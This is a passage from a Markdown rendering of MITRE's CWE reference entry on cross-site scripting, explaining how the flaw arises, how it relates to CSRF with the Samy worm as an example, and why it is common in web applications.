- **Other**: Attackers frequently use a variety of methods to encode the malicious portion of the attack, such as URL encoding or Unicode, so the request looks less suspicious. Phishing attacks could be used to emulate trusted web sites and trick the victim into entering a password, allowing the attacker to compromise the victim's account on that web site.

- **Other**:

  Cross-site scripting (XSS) vulnerabilities occur when:

  1. Untrusted data enters a web application, typically from a web request.
  2. The web application dynamically generates a web page that contains this untrusted data.
  3. During page generation, the application does not prevent the data from containing content that is executable by a web browser, such as JavaScript, HTML tags, HTML attributes, mouse events, Flash, ActiveX, etc.
  4. A victim visits the generated web page through a web browser, which contains malicious script that was injected using the untrusted data.
  5. Since the script comes from a web page that was sent by the web server, the victim's web browser executes the malicious script in the context of the web server's domain.
  6. This effectively violates the intention of the web browser's same-origin policy, which states that scripts in one domain should not be able to access resources or run code in a different domain.

- **Relationship**: There can be a close relationship between XSS and CSRF (CWE-352). An attacker might use CSRF in order to trick the victim into submitting requests to the server in which the requests contain an XSS payload. A well-known example of this was the Samy worm on MySpace [REF-956]. The worm used XSS to insert malicious HTML sequences into a user's profile and add the attacker as a MySpace friend. MySpace friends of that victim would then execute the payload to modify their own profiles, causing the worm to propagate exponentially. Since the victims did not intentionally insert the malicious script themselves, CSRF was a root cause.

- **Applicable Platform**: XSS flaws are very common in web applications, since they require a great deal of developer discipline to avoid them.

---
Generated from MITRE's CWE 5.0 XML (cwec_v5.0.xml) by weakness/mitre.org/cwe/scripts/cwe_to_markdown.py. Content history is omitted.
Copyright © The MITRE Corporation. CWE™ is a trademark of The MITRE Corporation.
Used under the CWE Terms of Use: https://cwe.mitre.org/about/termsofuse.html (full text: https://github.com/CloudSecurityAlliance-DataSets/dataset-public-laws-regulations-standards/blob/main/weakness/mitre.org/cwe/5.0/LICENSE.txt).
